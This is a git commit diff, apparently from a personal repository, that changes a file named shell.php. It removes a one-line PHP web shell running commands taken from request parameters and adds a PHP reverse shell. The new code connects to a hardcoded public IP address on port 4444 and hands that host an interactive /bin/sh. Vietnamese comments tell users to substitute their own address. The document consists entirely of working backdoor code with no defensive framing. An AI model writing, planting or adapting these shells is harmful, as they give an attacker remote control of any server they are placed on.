29277b2d080cd582925a4cb369db7517964b6f81
Hoàng Tiến Minh <153218340+cr0nica1@users.noreply.github.com>
2025-04-16 21:43:46 +0700

    Update shell.php

--- shell.php
+++ shell.php
@@ -1,1 +1,6 @@
-<?php system($_REQUEST['cmd']); ?>
+<?php
+    $ip = '58.186.78.65';  // Thay YOUR_IP bằng địa chỉ IP công cộng của bạn
+    $port = 4444;      // Thay 4444 bằng cổng bạn muốn lắng nghe
+    $sock = fsockopen($ip, $port);
+    exec("/bin/sh -i <&3 >&3 2>&3");
+?>
